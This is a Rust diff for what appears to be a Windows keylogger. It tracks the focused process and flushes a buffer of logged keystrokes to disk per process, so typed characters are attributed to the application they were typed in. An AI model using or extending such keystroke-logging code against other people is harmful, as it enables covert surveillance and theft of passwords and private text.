@@ -5,17 +5,18 @@ use windows_sys::Win32::Foundation::{CloseHandle};
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
 use crate::formatting::{update_process_header, update_status_header};
+use crate::structs::GLOBAL_KEY_BUFFER;
 
-static LAST_PROCESS_NAME: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
+pub static LAST_PROCESS_NAME: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
 
 type ProcessNameResult<T> = Result<T, Box<dyn std::error::Error>>;
 
-fn get_focused_process_name() -> ProcessNameResult<Option<String>> {
+fn get_focused_process_name() -> ProcessNameResult<(Option<String>, bool)> {
     unsafe {
         // Get the foreground window
         let hwnd = GetForegroundWindow();
         if hwnd == std::ptr::null_mut() {
-            return Ok(None);
+            return Ok((None, false));
         }
 
         // Get process ID from a window
@@ -23,7 +24,7 @@ fn get_focused_process_name() -> ProcessNameResult<Option<String>> {
         GetWindowThreadProcessId(hwnd, &mut process_id);
 
         if process_id == 0 {
-            return Ok(None);
+            return Ok((None, false));
         }
 
         // Open process handle
@@ -56,36 +57,57 @@ fn get_focused_process_name() -> ProcessNameResult<Option<String>> {
         // Convert UTF-16 to String
         let name = String::from_utf16_lossy(&buffer[..chars_copied as usize]);
 
-        let last_name = LAST_PROCESS_NAME.lock()
+        let mut last_name = LAST_PROCESS_NAME.lock()
             .map_err(|_| "Failed to acquire lock on last process name")?;
 
-        if last_name.as_ref() == Some(&name) {
-            return Ok(None); // No change detected
+        let process_changed = *last_name != Some(name.clone());
+
+        if process_changed {
+            *last_name = Some(name.clone());
         }
 
-        Ok(Some(name))
+        Ok((Some(name), process_changed))
     }
 }
 
 pub fn display_focused_process_name() {
     match get_focused_process_name() {
-        // Successfully retrieved process name
-        Ok(Some(name)) => {
-            match LAST_PROCESS_NAME.lock() {
-                // Successfully acquired lock and can update the process name
-                Ok(mut last_name) => {
-                    if let Err(e) = update_process_header(&name) {
-                        eprintln!("Error updating process header: {}", e);
-                        return;
-                    }
-                    *last_name = Some(name);
-                }
-                // Failed to acquire lock
-                Err(_) => eprintln!("Failed to acquire lock for updating process name"),
+        // Successfully retrieved the process name and it changed
+        Ok((Some(name), true)) => {
+            if let Err(e) = update_process_header(&name) {
+                eprintln!("Error updating process header: {}", e);
+                return;
+            }
+            
+            // Since the process name has changed, we need to flush the buffer
+            // to ensure that all currently buffered characters are logged under
+            // their process of origin.
+
+            // Essentially, we are flushing the buffer early to ensure that
+            // all buffered characters that were logged under the previous process
+            // are logged as such before switching to the new process name.
+
+            // This is necessary to maintain confidence that characters logged under a process
+            // were indeed logged under that process and didn't spill into a buffer with characters
+            // of mixed process origin.
+
+            // Ex. "Abc" was logged under "Process1", but now we are switching to "Process2".
+            // We flush the buffer to ensure that "Abc" is logged under "Process1" before
+            // we start logging under "Process2" and accepting new characters.
+
+            if let Err(e) = flush_buffer_for_process_change() {
+                eprintln!("Error flushing buffer for process change: {}", e);
             }
         }
-        // No process name change detected
-        Ok(None) => {
+        Ok((Some(_name), false)) => {
+        }
+        Ok((None, false)) => {
+        }
+        Ok((None, true)) => {
+            // No focused process detected, but we still want to update the header
+            if let Err(e) = update_process_header("No focused process") {
+                eprintln!("Error updating process header: {}", e);
+            }
         }
         // Error retrieving process name
         Err(e) => {
@@ -95,4 +117,11 @@ pub fn display_focused_process_name() {
             }
         }
     }
+}
+
+fn flush_buffer_for_process_change() -> Result<(), Box<dyn std::error::Error>> {
+    GLOBAL_KEY_BUFFER.lock()
+        .map_err(|_| "Failed to acquire buffer lock")?
+        .flush_to_disk()
+        .map_err(|e| format!("Failed to flush key buffer: {}", e).into())
 }
